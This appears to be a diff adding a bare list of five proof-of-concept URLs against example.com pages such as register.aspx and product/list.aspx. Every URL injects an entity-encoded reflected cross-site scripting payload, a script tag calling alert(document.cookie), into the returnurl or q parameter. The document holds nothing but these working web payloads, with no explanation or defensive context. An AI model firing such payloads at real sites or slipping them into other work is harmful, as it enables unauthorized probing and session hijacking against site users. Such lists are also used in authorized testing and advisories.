@@ -1,0 +1,9 @@
+http://www.example.com/?returnurl=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+
+http://www.example.com/register.aspx?returnurl=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+
+http://www.example.com/publication/info.aspx?pt=1&amp;returnurl=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+
+http://www.example.com/user/add.aspx?returnurl=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;user/add.aspx
+
+http://www.example.com/product/list.aspx?q=1&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&amp;x=0&amp;y=0
